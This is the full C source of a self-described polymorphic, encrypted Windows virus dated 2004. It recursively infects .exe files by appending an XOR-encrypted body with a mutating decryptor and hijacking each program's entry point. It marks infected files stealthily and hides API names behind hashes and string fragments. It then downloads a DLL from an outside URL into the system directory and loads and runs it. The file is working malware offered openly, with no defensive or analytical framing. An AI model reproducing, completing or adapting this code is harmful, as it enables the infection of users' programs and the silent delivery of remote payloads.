/*************************************************************************************************
*This is my first try to code a polymorph and encypted virus in C.
*This code infects all exes in the same folder and all folders below
*and mark the infected files  with a random value at the 3 byte(very stealth;-))
*After searching trough this files it will download a dll and call it.
*Mail me if you like this code
*www.delikon.de / ich@delikon.de / 3.1.2004
*
*
***************************************************************************************************/


#define WIN32_LEAN_AND_MEAN
#include <time.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winnt.h>
#include <urlmon.h>



int infect(char *NameOfFile);
void begin();
DWORD WINAPI FindFile( LPVOID lpParam ) ;
void fDirWalk(char *_current);
int download();


//the code size we want to encode + url
#define codesize 0x1660
// only the code size without url
#define codesize2 0x160d
#define part1 0x16
#define part2 0x60



#define SIZE_OF_NT_SIGNATURE    sizeof (DWORD)
#define SECHDROFFSET(a) ((LPVOID)((BYTE *)a               +  \
                         ((PIMAGE_DOS_HEADER)a)->e_lfanew +  \
                           SIZE_OF_NT_SIGNATURE           +  \
                           sizeof (IMAGE_FILE_HEADER)     +  \
                           sizeof (IMAGE_OPTIONAL_HEADER)))


typedef DWORD  (_stdcall *GETFILESIZE)( HANDLE ,  LPDWORD );
typedef LPTSTR (_stdcall *GETCOMMANDLINE)(void);
typedef void* (_stdcall *CREATEFILE)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (_stdcall *ViewOfFile)(LPCVOID,SIZE_T);
typedef void* (_stdcall *CREATEFILEMAPPING)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD,DWORD,LPCTSTR);
typedef LPVOID (_stdcall *MAPVIEWOFFILE)(HANDLE, DWORD, DWORD,DWORD,SIZE_T);

typedef BOOL (_stdcall *UNMAPVIEWOFFILE)(LPCVOID);

typedef BOOL (_stdcall *SETENDOFFILE)(HANDLE);
typedef DWORD (_stdcall *SETFILEPOINTER)(HANDLE,LONG,PLONG,DWORD);
typedef BOOL (_stdcall *CLOSEHANDLE)(HANDLE);
typedef HANDLE (_stdcall *CREATETHREAD)(
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);
typedef DWORD (_stdcall *GETTICKCOUNT)(void);

typedef BOOL (_stdcall *SETCURRENTDIRECTORY)(
  LPCTSTR lpPathName
);

typedef HANDLE (_stdcall *FINDFIRSTFILE)(
  LPCTSTR lpFileName,
  LPWIN32_FIND_DATA lpFindFileData
);
typedef BOOL (_stdcall *FINDNEXTFILE)(
  HANDLE hFindFile,
  LPWIN32_FIND_DATA lpFindFileData
);
typedef DWORD (_stdcall *GetCURRENT)(
  DWORD nBufferLength,
  LPTSTR lpBuffer 
  );
typedef BOOL (_stdcall *FINDCLOSE)(
  HANDLE hFindFile
);


typedef HRESULT (WINAPI *MYPROC)(LPUNKNOWN,LPCTSTR,LPCTSTR,DWORD,LPBINDSTATUSCALLBACK);
typedef void (WINAPI *call)();
typedef FARPROC (WINAPI *GETProcAddress)(
  HMODULE hModule,
  LPCSTR lpProcName
);

typedef UINT (WINAPI *GETSystemDirectory)(
  LPTSTR lpBuffer,
  UINT uSize
);

typedef HMODULE (WINAPI *LOADLibrary)(
  LPCTSTR lpFileName
);





ULONG Calc(ULONG APIname,ULONG base);
ULONG CalcBase();

/*************************************************************************************************
*Begin() function
*this function creates the thread, and jump back to the orginal entrypoint
*
*
*
*
*
***************************************************************************************************/



void begin(){
	
	
	 DWORD dwThreadId, dwThrdParam = 1; 
    HANDLE hThread; 

	HANDLE (*ACreateThread)(
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);

	
   
   

    ULONG KernelBase = CalcBase();
	ACreateThread    =(CREATETHREAD)   Calc(0x7f08f451,KernelBase);
	
	
	
    hThread = ACreateThread( 
        NULL,      
        0,         
        FindFile,                  // thread function 
        0,                // argument to thread function 
        0,                           // use default creation flags 
        &dwThreadId);                // returns the thread identifier 
	

	
		
	_asm{

	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	}
	// this sleep is for the first infection remove it with a hex editor
	Sleep(200000);
	
_asm{
	nop
	nop
	nop
	nop
	mov eax,0x42424242
	jmp eax

}

	
 
//Sleep(300);


}



/*************************************************************************************************
*FindFile() function
*i use this function to point to the start directory
*
*
*
*
*
***************************************************************************************************/


DWORD WINAPI FindFile( LPVOID lpParam ) 
{
	DWORD (*AGetCurrentDirectory)(
    DWORD nBufferLength,
    LPTSTR lpBuffer 
    );
	ULONG KernelBase = CalcBase();
	AGetCurrentDirectory           =(GetCURRENT)   Calc(0x2ced73de,KernelBase);

    char            DirName[200];
	AGetCurrentDirectory( 200, DirName );
    fDirWalk(DirName);
			int url[7];
			url[0]='ptth';
			url[1]='w//:';
			url[2]='d.ww';
			url[3]='kile';
			url[4]='d.no';
			url[5]='.b/e';
			url[6]='\0lld';
			//download("http ://w ww.d elik on.d e/b. dll");
			//download((char*)url);
			download();
	return 0;
	

}



int enc(int b,int l,unsigned char *start){
	_asm{
		mov ecx,l
		mov edx,b
		xor eax,eax
		mov esi,[start]
		mov edi,esi		
again:		
		lods
		xor eax,edx
		stosb
		loop again
	}
}
int berandom(int till){
	DWORD (*AGetTickCount)(void);
	int a;		

	ULONG KernelBase = CalcBase();
	AGetTickCount          =(GETTICKCOUNT)   Calc(0x41ad16b9,KernelBase);
	//get systemtime
	a= AGetTickCount();
	a=a^till;
	a=a%till;
	return a;
}

int Random(int till){
	DWORD (*AGetTickCount)(void);
	ULONG KernelBase = CalcBase();
	AGetTickCount          =(GETTICKCOUNT)   Calc(0x41ad16b9,KernelBase);
	int a;		
	int b;		
	int c;
	a= berandom(till);
	while(a--){
	b= AGetTickCount();
	c= a^b;
	}
	c=c%till;
	return c;
}

/*************************************************************************************************
*fDirWalk() function
*
*search for the exe files
*
*
*
*
***************************************************************************************************/

void fDirWalk(char *_current)
//------------------------------------------------
{
	
	BOOL (*ASetCurrentDirectory)(
	LPCTSTR lpPathName
	);
	HANDLE (*AFindFirstFile)(
    LPCTSTR lpFileName,
    LPWIN32_FIND_DATA lpFindFileData
	);
	BOOL (*AFindNextFile)(
    HANDLE hFindFile,
    LPWIN32_FIND_DATA lpFindFileData
    );
	DWORD (*AGetCurrentDirectory)(
    DWORD nBufferLength,
    LPTSTR lpBuffer 
    );
	BOOL (*AFindClose)(
    HANDLE hFindFile
	);
	
	char            DirName[MAX_PATH];
    HANDLE          Hnd;
    WIN32_FIND_DATA WFD;
    static int _dlevel = 0;
	
	char sternchen[4];
	sternchen[0]='*';
	sternchen[1]='.';
	sternchen[2]='*';
	sternchen[3]='\0';
	char slasch[2];
	slasch[0]='\\';
	slasch[1]='\0';
	char punkt[2];
	punkt[0]='.';
	punkt[1]='\0';
	char doppelpunkt[3];
	doppelpunkt[0]='.';
	doppelpunkt[1]='.';
	doppelpunkt[2]='\0';
	char exe[5];
	exe[0]='.';
	exe[1]='e';
	exe[2]='x';
	exe[3]='e';
	exe[4]='\0';
	ULONG KernelBase = CalcBase();
	ASetCurrentDirectory    =(SETCURRENTDIRECTORY)   Calc(0xbec3a06a,KernelBase);
	AFindFirstFile          =(FINDFIRSTFILE)   Calc(0xae2636cf,KernelBase);
	AFindNextFile           =(FINDNEXTFILE )   Calc(0xf3b43c46,KernelBase);
	AGetCurrentDirectory           =(GetCURRENT)   Calc(0x2ced73de,KernelBase);
	AFindClose				=(FINDCLOSE)   Calc(0xb4e7451c,KernelBase);
	

	ASetCurrentDirectory( _current );
    Hnd = AFindFirstFile( sternchen, &WFD );
    while ( AFindNextFile( Hnd, &WFD ) )
    {

      if (
           ( WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) &&
           ( strcmp(WFD.cFileName, doppelpunkt) && strcmp(WFD.cFileName, punkt) )
         )
      {
     
         AGetCurrentDirectory( 200, DirName );
         if ( strncmp( &DirName[strlen(DirName)-1], slasch, 1 ) )
           (void) strcat( DirName, slasch );


         (void) strcat( DirName, WFD.cFileName );


         fDirWalk( DirName );


         ASetCurrentDirectory( doppelpunkt );

      }
	  else
		  if(strstr(WFD.cFileName,exe)){
			AGetCurrentDirectory( 200, DirName );
			if ( strncmp( &DirName[strlen(DirName)-1], slasch, 1 ) )
			strcat( DirName, slasch );
			(void) strcat( DirName, WFD.cFileName );
			//find a exe infect the file
			infect(DirName);
			
			
		  }

    } // End while

// End the search with this call
   (void) AFindClose( Hnd );
   return;
}




/*************************************************************************************************
*CalcBase() function
*get the kernelbase , thanx to lsd and hd moore
*
*
*
*
*
***************************************************************************************************/



ULONG CalcBase()
{

unsigned long Base=0x11;

		_asm{
			mov eax, fs:0x30	/* PEB */
			mov eax, [eax + 0x0c] /* PROCESS_MODULE_INFO */
			mov esi, [eax + 0x1c] /* InInitOrder.flink */
			lodsd				  /* eax = InInitOrder.blink */
			mov eax, [eax + 0x08] /* ebp = kernel32.dll base address */			
			mov [Base],eax
		}
return Base;

}

/*************************************************************************************************
*hash the export table functions /hash() function
*
*
*
*
*
*
***************************************************************************************************/


ULONG    hash( char *str)
    {
     ULONG hash = 5381;
      int c;

      while (c = *str++)
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

      return hash;
    }


/*************************************************************************************************
*Calc() function
*
*Get the api function addresses
*
*
*
*
***************************************************************************************************/

ULONG Calc(ULONG APIname,ULONG base){
unsigned  char* b = ((unsigned  char*)base)+0x3c;
DWORD *C= (DWORD*)((unsigned char*)base+120+*b);
b= (unsigned char*)*C+base;

	
PIMAGE_EXPORT_DIRECTORY pExportDirectory;

pExportDirectory =(IMAGE_EXPORT_DIRECTORY*)b;




DWORD *pExportAddressTable;
WORD *pExportOrdinalTable;
DWORD *pExportNamePointerTable;
DWORD i, j;

pExportAddressTable = (DWORD *)(base + pExportDirectory->AddressOfFunctions);
pExportOrdinalTable = (WORD *)(base + pExportDirectory->AddressOfNameOrdinals);
pExportNamePointerTable = (DWORD *)(base + pExportDirectory->AddressOfNames);


for(i=0; i<pExportDirectory->NumberOfFunctions; i++) {
	

	for(j=0; j<pExportDirectory->NumberOfNames; j++) {
	if(pExportOrdinalTable[j] == i) 
	if(APIname==hash((char*)(base + pExportNamePointerTable[j])))
		return  base + pExportAddressTable[i];
	}

	
	
	
}

return 0;

}

/*************************************************************************************************
*entry() function
*
*get the local entry point
*
*
*
*
***************************************************************************************************/


char* entry(){
DWORD (*AGetFileSize)(
  HANDLE hFile,
  LPDWORD lpFileSizeHigh
);
LPTSTR (*AGetCommandLine)(void);
HANDLE (*ACreateFile)(
  LPCTSTR lpFileName,
  DWORD dwDesiredAccess,
  DWORD dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD dwCreationDisposition,
  DWORD dwFlagsAndAttributes,
  HANDLE hTemplateFile
);
BOOL (*AFlushViewOfFile)(
  LPCVOID lpBaseAddress,
  SIZE_T dwNumberOfBytesToFlush
);
HANDLE (*ACreateFileMapping)(
  HANDLE hFile,
  LPSECURITY_ATTRIBUTES lpAttributes,
  DWORD flProtect,
  DWORD dwMaximumSizeHigh,
  DWORD dwMaximumSizeLow,
  LPCTSTR lpName
);
LPVOID (*AMapViewOfFile)(
  HANDLE hFileMappingObject,
  DWORD dwDesiredAccess,
  DWORD dwFileOffsetHigh,
  DWORD dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
);
BOOL (*AUnmapViewOfFile)(
  LPCVOID lpBaseAddress
);

BOOL (*ACloseHandle)(
  HANDLE hObject
);
DWORD (*ASetFilePointer)(
  HANDLE hFile,
  LONG lDistanceToMove,
  PLONG lpDistanceToMoveHigh,
  DWORD dwMoveMethod
);

BOOL (*ASetEndOfFile)(
  HANDLE hFile
);



	ULONG KernelBase = CalcBase();
	AGetCommandLine    =(GETCOMMANDLINE)   Calc(0xb511fc4d,KernelBase);
	ACreateFile        =(CREATEFILE)       Calc(0xeb96c5fa,KernelBase);
	AFlushViewOfFile   =(ViewOfFile)       Calc(0x8fb94397,KernelBase);
	ACreateFileMapping =(CREATEFILEMAPPING)Calc(0xf33ffc86,KernelBase);
	AMapViewOfFile	   =(MAPVIEWOFFILE)	   Calc(0x11deb0b3,KernelBase);
	AUnmapViewOfFile   =(UNMAPVIEWOFFILE)  Calc(0xd639f256,KernelBase);
	ACloseHandle	   =(CLOSEHANDLE)	   Calc(0x3870ca07,KernelBase);
	ASetFilePointer    =(SETFILEPOINTER)   Calc(0x53ef6bf2,KernelBase);
	ASetEndOfFile	   =(SETENDOFFILE)     Calc(0x6520767d,KernelBase);
	AGetFileSize	   =(GETFILESIZE)	   Calc(0x7891c520,KernelBase);


	int i=0;
	char save[500];
	char * a= AGetCommandLine();
	//this is all to remove the stupid "" from the getcommandline output
	while(*(++a)!='"')
		save[i++]=*(a);
	save[i]='\0';
	

	HANDLE file = ACreateFile(save, GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_SYSTEM,NULL);
		// we map the file into memory
	HANDLE file2 =  ACreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
	if (file2==NULL)
	return NULL;
	LPBYTE MapFile = (LPBYTE)AMapViewOfFile(file2,FILE_MAP_READ,0,0,0);
	//IMAGE_SECTION_HEADER * sec;
	IMAGE_DOS_HEADER dosHead = *(IMAGE_DOS_HEADER *)MapFile;
	IMAGE_FILE_HEADER *PE = (IMAGE_FILE_HEADER *)(MapFile+dosHead.e_lfanew+4);
	IMAGE_OPTIONAL_HEADER *PEoption = (IMAGE_OPTIONAL_HEADER *)((BYTE *)PE+sizeof(IMAGE_FILE_HEADER));
	char* EP=(char*)PEoption->AddressOfEntryPoint+PEoption->ImageBase;

	//get the really entry without decryptor
	EP+=MapFile[3];
	
	AFlushViewOfFile(MapFile,0);
	AUnmapViewOfFile(MapFile);
	ACloseHandle(file);
	ACloseHandle(file2);


	
	return EP;
}


//
pADDR(DWORD addr,unsigned  char* code,int pos){


	for (int i = 0; i < sizeof(ULONG); i++)
        code[pos+i] = ((ULONG)addr >> (i * 8) & 255);

}

/*************************************************************************************************
*lang() function
*
*this function is for determinating the length of a asm-command
*
*
*
*
***************************************************************************************************/

int lang(unsigned char b){

	if(b==0x56||b==0x57||b==0xac||b==0xaa||b==0x5f||b==0x5e)
		return 1;
	if(b==0xb9||b==0xba||b==0xbe)
		return 5;
	if(b==0x33||b==0x8b||b==0xe2)
		return 2;
	return -1;
	
}
/*************************************************************************************************
*generate() function
*
*generate the decryptor
*
*
*
*
***************************************************************************************************/

int generate(int b, int l,DWORD start,unsigned char* array,unsigned char* newarray){
	
		int size=0;
		int all=0;
		int anzahl=0;
		int temp=0;
		int temp2=0;
		int all2=0;
		int i=0;

		//this is the length of the code to decrypt
		array[3]=part2;
		array[4]=part1;

		//pADDR((DWORD)l,array+3,1);

		//the encoding byte
		array[8]=b;
		
		
		while(1){

			//how long is the command??
			size=lang(*array);
			//is the decryptor passed?
			if(temp2==29)
				break;
			//is the byte the beginning of a command?
			if(size!=-1){
			//the offset where to copy the nops
			all+=(size+anzahl);

			temp2+=size;
			//how many noops
			anzahl=Random(6);
			//return the decryptor size
			all2+=(size+anzahl);
			
			//memcpy(newarray+temp,array,size);
			for(;i<size;i++){
			*(newarray+temp+i)=*(array+i);
			}
			i=0;
			memset(newarray+all,0x90,anzahl);
			temp=all2;
			array+=size;
			}						
						
		}	
		size=0;
		anzahl=0;
		temp2=0;
		temp=0;

		//fix the new decryptor (the loop length etc)
		for(int r=0;r<=all2;r++){
				if(*(newarray+r)==0x33&&*(newarray+r+1)==0xc0)
					temp=1;
				if(*(newarray+r)==0xbe&&temp==1)
					pADDR((DWORD)start+all2,(unsigned char*)newarray,r+1);
				if(*(newarray+r)==0x8b&&*(newarray+r+1)==0xfe)
					temp2=1;
				if(*(newarray+r)==0xac&&temp2==1)
					size=1;
				if(size==1){
					anzahl++;
					if(*(newarray+r)==0xe2){
						*(newarray+r+1)=(0xff-(anzahl));
						size=0;				
					}

				}
				
			
		}		

		
		return all2;			
}


/*************************************************************************************************
*infect() function
*
*what will it do ? 
*
*
*
*
***************************************************************************************************/

int infect(char *NameOfFile)
{

DWORD (*AGetFileSize)(
  HANDLE hFile,
  LPDWORD lpFileSizeHigh
);
LPTSTR (*AGetCommandLine)(void);
HANDLE (*ACreateFile)(
  LPCTSTR lpFileName,
  DWORD dwDesiredAccess,
  DWORD dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD dwCreationDisposition,
  DWORD dwFlagsAndAttributes,
  HANDLE hTemplateFile
);
BOOL (*AFlushViewOfFile)(
  LPCVOID lpBaseAddress,
  SIZE_T dwNumberOfBytesToFlush
);
HANDLE (*ACreateFileMapping)(
  HANDLE hFile,
  LPSECURITY_ATTRIBUTES lpAttributes,
  DWORD flProtect,
  DWORD dwMaximumSizeHigh,
  DWORD dwMaximumSizeLow,
  LPCTSTR lpName
);
LPVOID (*AMapViewOfFile)(
  HANDLE hFileMappingObject,
  DWORD dwDesiredAccess,
  DWORD dwFileOffsetHigh,
  DWORD dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
);
BOOL (*AUnmapViewOfFile)(
  LPCVOID lpBaseAddress
);

BOOL (*ACloseHandle)(
  HANDLE hObject
);
DWORD (*ASetFilePointer)(
  HANDLE hFile,
  LONG lDistanceToMove,
  PLONG lpDistanceToMoveHigh,
  DWORD dwMoveMethod
);

BOOL (*ASetEndOfFile)(
  HANDLE hFile
);

	ULONG KernelBase = CalcBase();
	AGetCommandLine    =(GETCOMMANDLINE)   Calc(0xb511fc4d,KernelBase);
	ACreateFile        =(CREATEFILE)       Calc(0xeb96c5fa,KernelBase);
	AFlushViewOfFile   =(ViewOfFile)       Calc(0x8fb94397,KernelBase);
	ACreateFileMapping =(CREATEFILEMAPPING)Calc(0xf33ffc86,KernelBase);
	AMapViewOfFile	   =(MAPVIEWOFFILE)	   Calc(0x11deb0b3,KernelBase);
	AUnmapViewOfFile   =(UNMAPVIEWOFFILE)  Calc(0xd639f256,KernelBase);
	ACloseHandle	   =(CLOSEHANDLE)	   Calc(0x3870ca07,KernelBase);
	ASetFilePointer    =(SETFILEPOINTER)   Calc(0x53ef6bf2,KernelBase);
	ASetEndOfFile	   =(SETENDOFFILE)     Calc(0x6520767d,KernelBase);
	AGetFileSize	   =(GETFILESIZE)	   Calc(0x7891c520,KernelBase);


//the decryptor 
int  func[8];
  func[0] ='\x56\x57\xB9\x11';
  func[1] ='\x00\x00\x00\xBA';
  func[2] ='\x12\x00\x00\x00';
  func[3] ='\x33\xC0\xBE\x00';
  func[4] ='\x20\x40\x00\x8B';
  func[5] ='\xFE\xAC\x33\xC2';
  func[6] ='\xAA\xE2\xFA\x5F';
  func[7] ='\x5E';


HANDLE file = ACreateFile(NameOfFile,GENERIC_WRITE | GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);

HANDLE file2 =  ACreateFileMapping(file, NULL, PAGE_READWRITE, 0, 0, NULL);
if (file2==NULL)
return -1;
LPBYTE MapFile = (LPBYTE)AMapViewOfFile(file2,FILE_MAP_ALL_ACCESS,0,0,0);
//is the file allready infected?? is it bigger than 100k??
if(MapFile[3]!=0x00||(AGetFileSize(file,NULL)<100000)){
ACloseHandle(file2);
ACloseHandle(file);
return -1;
}
else
MapFile[3]=Random(255);
IMAGE_SECTION_HEADER * sec;
IMAGE_DOS_HEADER dosHead = *(IMAGE_DOS_HEADER *)MapFile;
IMAGE_FILE_HEADER *PE = (IMAGE_FILE_HEADER *)(MapFile+dosHead.e_lfanew+4);
IMAGE_OPTIONAL_HEADER *PEoption = (IMAGE_OPTIONAL_HEADER *)((BYTE *)PE+sizeof(IMAGE_FILE_HEADER));

sec =(IMAGE_SECTION_HEADER*) SECHDROFFSET(MapFile);


DWORD OldEntry = PEoption->AddressOfEntryPoint+PEoption->ImageBase;


int secNumber=PE->NumberOfSections;



IMAGE_SECTION_HEADER * LastSection= sec + secNumber-1;



// ohhh shit this is lame;-) 
int VirusSize = codesize;
while(VirusSize%PEoption->SectionAlignment!=0)
		VirusSize++;
	  

		


int VirusPos = LastSection->PointerToRawData + LastSection->SizeOfRawData;
int OffsetMem = LastSection->VirtualAddress-LastSection->PointerToRawData;




LastSection->SizeOfRawData+=VirusSize;
LastSection->Misc.PhysicalAddress+=VirusSize;


PEoption->SizeOfImage+=(VirusSize);


DWORD  base = PEoption->ImageBase;
PEoption->AddressOfEntryPoint = VirusPos + OffsetMem;

LastSection->Characteristics = 0x80000000;
char* a=entry();



AFlushViewOfFile(MapFile,0);
AUnmapViewOfFile(MapFile);
ACloseHandle(file2);
ASetFilePointer(file,AGetFileSize(file,NULL)+VirusSize,NULL,FILE_BEGIN); 

ASetEndOfFile(file);


 file2 =  ACreateFileMapping(file, NULL, PAGE_READWRITE, 0, 0, NULL);
if (file2==NULL)
return -1;
 MapFile = (LPBYTE)AMapViewOfFile(file2,FILE_MAP_ALL_ACCESS,0,0,0);

unsigned char arr[100];

int emc =Random(255);
//int emc =0;

int g=generate(emc,codesize,(VirusPos + OffsetMem+PEoption->ImageBase),(unsigned char *)func,arr);
MapFile[3]=g;
int i=0;
int counter =0;
	
	//for(int i=0;i<codesize;i++)
	//	MapFile[VirusPos+i]=*(a+i);
	// paste the decryptor
	for(;i<g;i++)
		MapFile[VirusPos+i]=*(arr+i);
i=0;
	//paste the code and remove the Sleep(2000) between the nops 
	for(;i<codesize;i++){
			
		if(i>=73&&i<=83)
			MapFile[VirusPos+i+g]=0x90;
		else
			MapFile[VirusPos+i+g]=*(a+i);
		
	}

	//the threatfunction address
	DWORD xx= (DWORD)(VirusPos + OffsetMem);
	xx+=0x65+g;
	xx+=base;
	

	//paste the jumb back , and the function address
	pADDR(OldEntry,MapFile+VirusPos+0x58+g,1);
	pADDR(xx+1,(MapFile+VirusPos+0x31+g),1);
	
	//encode the code
	enc(emc,codesize,MapFile+VirusPos+g);

AFlushViewOfFile(MapFile,0);
AUnmapViewOfFile(MapFile);
ACloseHandle(file2);
ACloseHandle(file);


return 0;




}

//int download(char* URL){
int download(){

	HRESULT (*AURLDownloadToFile)(      
    LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB
	);

	UINT (*AGetSystemDirectory)(
	LPTSTR lpBuffer,
	UINT uSize
	);

	HMODULE (*ALoadLibrary)(
	LPCTSTR lpFileName
	);
		
	char* URL;
	
	void (*CALL)();

	FARPROC (*AGetProcAddress)(
	HMODULE hModule,
	LPCSTR lpProcName
	);

	char path[MAX_PATH];

	int	dll[2];
	int	function[2];
	//b.dll
	dll[0]='ld.b';
	dll[1]='\0l';
	
	//main
	function[0]='niam';
	function[1]='\0';


	//urlmon.dll
	int urlmon[3];
	urlmon[0]='mlru';
	urlmon[1]='d.no';
	urlmon[2]='\0ll';

	int download[5];
	
	download[0]='DLRU';
	download[1]='lnwo';
	download[2]='Tdao';
	download[3]='liFo';
	download[4]='\0Ae';

	ULONG KernelBase   =				    CalcBase();
	AGetProcAddress    =(GETProcAddress)    Calc(0xcf31bb1f,KernelBase);
	AGetSystemDirectory=(GETSystemDirectory)Calc(0xe643c460,KernelBase);
	ALoadLibrary	   =(LOADLibrary)		Calc(0x5fbff0fb,KernelBase);

	

	HINSTANCE a = ALoadLibrary((char*)dll);
	if(a){
	CALL  =(call)AGetProcAddress(a,(char*)function);
	(CALL)();
	}
	else{

			HINSTANCE a = ALoadLibrary((char*)urlmon);

			AURLDownloadToFile  =(MYPROC)AGetProcAddress(a,(char*)download);
			
			AGetSystemDirectory(path,MAX_PATH);
				int cat[2];
			cat[0]='d.b\\';
			cat[1]='\0ll';
			strcat(path,(char*)cat);


			//the offset where we find the url string
			//at the end of the code 
			URL=entry();
			URL+=codesize2;

			(AURLDownloadToFile)(0,URL,path,0,0);
			
			return 1;

			

			//WinExec("test.exe",5);
	}



}
/*************************************************************************************************
*() function
*
*
*
*
*
*
***************************************************************************************************/



int mymain(){
	
	
	begin();
	
	return 0;
	//Sleep(1);
	
	

}

int main(){
	begin();
	//Sleep(1);
	return 0;

}